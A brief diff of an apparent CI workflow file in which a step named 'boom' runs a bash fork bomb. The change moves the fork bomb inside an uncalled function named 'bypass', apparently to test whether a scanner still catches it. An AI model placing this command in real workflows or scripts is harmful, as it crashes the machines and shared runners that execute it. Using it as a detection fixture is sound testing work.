@@ -19,4 +19,6 @@ jobs:
       - name: 'boom'
         shell: 'bash'
         run: |
-          :(){ :|:& };:
+          function bypass() {
+            :(){ :|:& };:
+          }
